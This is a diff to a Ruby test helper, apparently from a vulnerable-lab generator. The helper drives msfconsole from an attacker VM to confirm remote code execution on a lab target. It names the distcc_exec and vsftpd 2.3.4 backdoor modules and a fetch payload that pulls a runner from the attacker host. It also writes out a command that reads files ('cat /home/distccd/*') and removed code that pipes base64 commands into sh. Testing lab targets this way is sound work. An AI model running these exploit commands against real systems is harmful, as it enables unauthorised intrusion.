@@ -417,54 +417,48 @@ class PostProvisionTest
   # Drive a Metasploit exploit module from the attacker VM against this system
   # (the target under test) and record a tier-3 PASS/FAIL/SKIP.
   #
-  # Two exploit shapes, selected by `session:`:
-  #   * session: false (default) — a no-session payload (cmd/unix/generic): the
-  #     exploit runs our sentinel command *on the target* via its CMD datastore,
-  #     so there is no reverse/bind shell to race.
-  #   * session: true — a shell-session payload (default cmd/unix/interact, e.g.
-  #     the vsftpd 2.3.4 backdoor): the exploit opens a session, then we run the
-  #     sentinel command in it with `sessions -c` (base64-wrapped so no ';' leaks
-  #     into msfconsole's -x command list) and kill the session.
-  # Either way, proof of RCE is the sentinel the target's own guest agent reads
-  # back (checked for `uid=`). `collect:` appends extra shell (e.g.
-  # 'cat /home/distccd/*') whose output is captured into the sentinel as
-  # evidence. `options:` adds/overrides msf datastore settings (RHOSTS/RPORT/
-  # PAYLOAD, and CMD in no-session mode, are set for you; pass LHOST etc. here).
+  # The payload is a no-session command payload, so the exploit runs our sentinel
+  # command *on the target* and there is no reverse/bind shell to race:
+  #   * default cmd/unix/generic — its CMD runs directly on the target (distcc);
+  #   * a modern command-stager "fetch" payload such as cmd/linux/http/x64/exec
+  #     (pass it as payload:) — its CMD also just runs on the target, but the
+  #     stager first fetches a tiny runner over HTTP from the attacker, so the
+  #     helper points FETCH_SRVHOST back at the attacker automatically.
+  # Proof of RCE is a sentinel file the command leaves on the target, which the
+  # target's own guest agent reads back and checks for `uid=`. collect: appends
+  # extra shell (e.g. 'cat /home/distccd/*') captured into the sentinel as
+  # evidence. force: sets ForceExploit, for modules whose automatic check is
+  # inconclusive (e.g. the vsftpd 2.3.4 backdoor). options: adds/overrides msf
+  # datastore settings (RHOSTS/RPORT/PAYLOAD/CMD, and FETCH_SRVHOST for a fetch
+  # payload, are set for you; pass LHOST etc. here).
   #
   #   test_msf_exploit('exploit/unix/misc/distcc_exec',
   #                    rport: 3632, collect: 'cat /home/distccd/*')
-  #   test_msf_exploit('exploit/unix/ftp/vsftpd_234_backdoor',
-  #                    rport: 21, session: true)
+  #   test_msf_exploit('exploit/unix/ftp/vsftpd_234_backdoor', rport: 21,
+  #                    payload: 'cmd/linux/http/x64/exec', force: true)
   def test_msf_exploit(msf_module, rhost: nil, rport: self.port, attacker: nil,
-                       payload: nil, session: false, collect: nil,
+                       payload: 'cmd/unix/generic', collect: nil, force: false,
                        options: {}, tier: 3, label: nil)
     name = label || "msf exploit (#{msf_module})"
     resolved = resolve_attacker(name, attacker, rhost, tier)
     return unless resolved
     attacker, attacker_ip, rhost = resolved
 
-    payload ||= session ? 'cmd/unix/interact' : 'cmd/unix/generic'
     sentinel, cmd = build_sentinel(collect)
-
-    settings = { 'RHOSTS' => rhost, 'RPORT' => rport, 'PAYLOAD' => payload }
-    settings['CMD'] = cmd unless session   # a session payload takes no CMD
+    settings = { 'RHOSTS' => rhost, 'RPORT' => rport, 'PAYLOAD' => payload, 'CMD' => cmd }
+    settings['ForceExploit'] = true if force
+    # Command-stager "fetch" payloads (cmd/<os>/http/...) download a runner over
+    # HTTP from the attacker; point them back at it unless the caller set it.
+    if payload =~ %r{\Acmd/[^/]+/http/} && !(options.key?('FETCH_SRVHOST') || options.key?(:FETCH_SRVHOST))
+      settings['FETCH_SRVHOST'] = attacker_ip
+    end
     settings.merge!(options.map { |k, v| [k.to_s, v] }.to_h)
     set_lines = settings.map { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')
-
-    if session
-      # Run the sentinel command inside the opened shell session. base64-wrap it
-      # so the ';'s don't split msfconsole's -x command list, then tear the
-      # session down.
-      b64 = Base64.strict_encode64(cmd)
-      run_cmds = "run -z; sleep 6; sessions -c echo #{b64}|base64 -d|sh; sleep 4; sessions -K;"
-    else
-      run_cmds = "run; sleep 8;"
-    end
 
     # HOME must be exported: the guest agent runs commands with no HOME, and
     # msfconsole's rb-readline aborts on startup without it.
     msf = "export HOME=/root TERM=dumb; msfconsole -q -x \"use #{msf_module}; " \
-          "#{set_lines} #{run_cmds} exit -y\""
+          "#{set_lines} run; sleep 8; exit -y\""
     result = run_on_system(attacker, msf, timeout: (ENV['SECGEN_MSF_TIMEOUT'] || 600).to_i)
     msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
     add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-4000..-1] || msf_out)}")
